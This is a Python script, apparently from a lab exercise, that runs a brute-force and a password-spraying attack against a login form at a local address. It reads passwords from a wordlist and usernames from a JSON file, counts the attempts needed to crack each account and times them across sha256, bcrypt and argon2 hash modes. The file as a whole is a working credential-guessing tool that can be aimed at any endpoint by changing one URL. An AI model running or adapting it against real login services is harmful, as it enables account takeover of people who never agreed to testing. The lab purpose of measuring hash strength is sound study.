import requests
import json
import time

LOGIN_URL = "http://127.0.0.1:5000/login"
PASSWORDS_FILE = "passwords.txt"
USERS_JSON = "users.json"
session = requests.Session()


def try_login(username, password, hash_mode):
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "username": username,
                "password": password,
                "hash_mode": hash_mode
            }
        )

        return "Welcome" in response.text or "test" in response.url

    except requests.RequestException as e:
        print("ERROR occured in the server:" + str(e))
        return False


def bruteforce(username, hash_mode):
    count = 0
    with open(PASSWORDS_FILE, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            if try_login(username, line, hash_mode):
                return count
            count += 1
    # if not successful return flag
    return -1


def password_spraying(users, hash_mode):
    successful_cracks = {}
    with open(PASSWORDS_FILE, "r") as file:
        passwords = file.readlines()
        for line in passwords:
            line = line.rstrip("\n")
            for user in users:
                if try_login(user, line, hash_mode):
                    successful_cracks[user] = line
    return successful_cracks


def get_user_list():
    user_list = []
    with open(USERS_JSON, "r") as f:
        data = json.load(f)
    for user in data['users']:
        user_list.append(user['username'])
    return user_list


def preform_bruteforce(hash_mode):
    count = 0
    start = time.time()
    for user in get_user_list():
        user_start = time.time()
        tries = bruteforce(user, hash_mode)
        user_end = time.time() - user_start
        status = "Success" if tries > 0 else "Fail"
        print(f"Username:'{user}', Time elapsed:{user_end}, Hash:{hash_mode}, Status:{status}")
        if tries > 0:
            count += tries
    end = time.time() - start
    return count, end


def main():
    hash_modes = ["sha256", "bcrypt", "argon2"]
    preform_bruteforce(hash_modes[0])
    # users = ["weak01","weak02","weak03","weak04","weak05"]
    # if bruteforce(get_user_list()[22], hash-modes[0]) > 0:
    #     print("Cracked")
    # else:
    #     print("Failed")
    # dic = password_spraying(users,hash-modes[0])
    # # print(dic)
    # print(get_user_list())


if __name__ == "__main__":
    main()
